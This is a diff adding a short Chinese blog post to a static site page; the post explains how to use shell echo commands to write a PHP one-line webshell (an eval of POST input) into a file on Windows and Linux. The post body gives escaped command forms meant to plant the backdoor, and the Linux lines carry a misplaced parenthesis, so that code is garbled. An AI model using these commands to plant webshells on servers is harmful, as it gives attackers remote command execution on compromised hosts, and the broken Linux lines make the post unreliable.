@@ -596,6 +596,191 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/echo写马的小技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Robot">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/0.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Robot's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/26/echo写马的小技巧/" itemprop="url">echo写马的小技巧</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-26T10:29:22+08:00">
+                2018-11-26
+              </time>
+            
+
+            
+
+            
+
+  <span class="post-updated">
+    &nbsp; | &nbsp; post.updated
+    <time itemprop="dateUpdated" datetime="2018-11-26T10:35:45+08:00" content="2018-11-26">
+      2018-11-26
+    </time>
+  </span>
+
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/26/echo写马的小技巧/" class="leancloud_visitors" data-flag-title="echo写马的小技巧">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span> 
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  92
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-首先给一个错误的写马方式"><a href="#0x00-首先给一个错误的写马方式" class="headerlink" title="0x00:首先给一个错误的写马方式"></a>0x00:首先给一个错误的写马方式</h2><h3 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01:Windows"></a>0x01:Windows</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; &gt; 1.php</code></p>
+<p><img src="/2018/11/26/echo写马的小技巧/errorma.png" alt=""></p>
+<p>你会发现文件里面多了双引号.</p>
+<h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02:Linux"></a>0x02:Linux</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p>
+<p><img src="/2018/11/26/echo写马的小技巧/errormalinux.png" alt=""></p>
+<p>$_POST无故消失.</p>
+<h2 id="0x10-正确的写马方式"><a href="#0x10-正确的写马方式" class="headerlink" title="0x10:正确的写马方式"></a>0x10:正确的写马方式</h2><h3 id="0x11-Windows"><a href="#0x11-Windows" class="headerlink" title="0x11:Windows"></a>0x11:Windows</h3><p><code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; 1.php</code></p>
+<p>在尖括号前面加^这个符号.</p>
+<p><img src="/2018/11/26/echo写马的小技巧/rightma.png" alt=""></p>
+<h3 id="0x12-Linux"><a href="#0x12-Linux" class="headerlink" title="0x12:Linux"></a>0x12:Linux</h3><p><code>echo &quot;&lt;?php @eval(\$_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p>
+<p>在$符前加斜杠.</p>
+<p><img src="/2018/11/26/echo写马的小技巧/rightmalinux.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+<div>
+  
+</div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -646,7 +831,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
